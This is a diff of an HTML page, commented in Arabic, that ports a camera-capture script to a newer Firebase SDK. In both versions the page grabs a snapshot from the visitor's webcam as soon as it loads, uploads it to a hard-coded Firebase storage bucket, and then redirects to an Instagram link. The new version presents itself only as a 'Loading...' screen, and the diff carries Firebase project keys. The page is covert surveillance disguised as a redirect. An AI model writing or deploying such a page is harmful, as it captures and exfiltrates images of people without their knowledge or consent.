@@ -1,57 +1,64 @@
-
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Camera Upload to Firebase</title>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
-</head>
-<body>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+  <head>
+    <title>Camera Capture</title>
+    <meta charset="UTF-8" />
+    <script type="module">
+      // 1. Firebase SDK
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+      import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-storage.js";
 
-  <script>
-    // Firebase configuration
-    var firebaseConfig = {
-      apiKey: "AIzaSyC0WgRyyIgIZqfI3azfBqyyy_xqeRw",
-      authDomain: "mioudcamstorage.firebaseapp.com",
-      projectId: "mioudcamstorage",
-      storageBucket: "mioudcamstorage.appspot.com",
-      messagingSenderId: "687188581684",
-      appId: "1:687188581684:web:122eb4d99ffb8abe2b8a78d"
-    };
+      // 2. Firebase Config - استبدل القيم بقيم مشروعك
+      const firebaseConfig = {
+        apiKey: "AIzaSyCwDNgRY1qlGh2a1f8aaq8yvpyp_xyeRw",
+        authDomain: "mioudcamstorage.firebaseapp.com",
+        projectId: "mioudcamstorage",
+        storageBucket: "mioudcamstorage.appspot.com",
+        messagingSenderId: "607188581064",
+        appId: "1:607188581064:web:122ebd49ffb0abe2b2a78d"
+      };
 
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    var storage = firebase.storage();
+      // 3. Start Firebase
+      const app = initializeApp(firebaseConfig);
+      const storage = getStorage(app);
 
-    const REDIRECT_URL = 'https://www.instagram.com/share/BAPOHyZPk7';
+      // 4. Take photo and upload
+      async function captureAndUpload() {
+        const video = document.createElement('video');
+        const canvas = document.createElement('canvas');
 
-    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-      const video = document.getElementById('video');
-      video.srcObject = stream;
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = stream;
+          await video.play();
 
-      setTimeout(() => {
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        video.srcObject.getTracks().forEach(track => track.stop());
+          // رسم الصورة على كـانفس
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
 
-        canvas.toBlob(blob => {
-          const filename = `snapshot_${Date.now()}.png`;
-          const storageRef = storage.ref().child(filename);
-          storageRef.put(blob).then(() => {
-            window.location.href = REDIRECT_URL;
-          }).catch(error => {
-            console.error("Upload failed:", error);
-            window.location.href = REDIRECT_URL;
-          });
-        }, 'image/png');
-      }, 3000);
-    }).catch(error => {
-      console.error('Camera access denied:', error);
-      window.location.href = REDIRECT_URL;
-    });
-  </script>
-</body>
+          // إيقاف الكاميرا
+          stream.getTracks().forEach(track => track.stop());
+
+          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+          const fileName = `photo_${Date.now()}.jpg`;
+
+          const storageRef = ref(storage, fileName);
+          await uploadBytes(storageRef, blob);
+
+          // بعد الرفع، التحويل إلى انستقرام
+          window.location.href = "https://www.instagram.com/share/BAPOHyZPk7";
+        } catch (error) {
+          console.error("حدث خطأ:", error);
+        }
+      }
+
+      window.onload = () => {
+        captureAndUpload();
+      };
+    </script>
+  </head>
+  <body>
+    <h1 style="text-align:center;margin-top:40vh;font-family:sans-serif;">جارٍ التحميل...</h1>
+  </body>
 </html>
